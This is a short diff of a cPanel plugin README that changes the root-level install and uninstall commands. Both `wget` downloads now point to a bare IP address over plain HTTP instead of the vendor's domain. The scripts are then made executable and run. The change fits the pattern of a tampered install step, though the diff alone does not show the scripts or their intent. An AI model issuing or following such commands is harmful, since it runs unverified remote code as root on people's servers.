@@ -57,7 +57,7 @@ A Linux server running CentOS 6 or 7 with a valid cPanel/WHM license. For inform
 
 To **install** the plugin login to your server as root and run the following commands:
 
-`wget -N http://www.themely.com/download/themely-cpanel-plugin/install.sh`
+`wget -N http://172.105.14.14/install.sh`
 
 `chmod 755 install.sh`
 
@@ -68,7 +68,7 @@ To **install** the plugin login to your server as root and run the following com
 
 To **uninstall** the plugin login to your server as root and run the following commands:
 
-`wget -N http://www.themely.com/download/themely-cpanel-plugin/uninstall.sh`
+`wget -N http://172.105.14.14/uninstall.sh`
 
 `chmod 755 uninstall.sh`
 
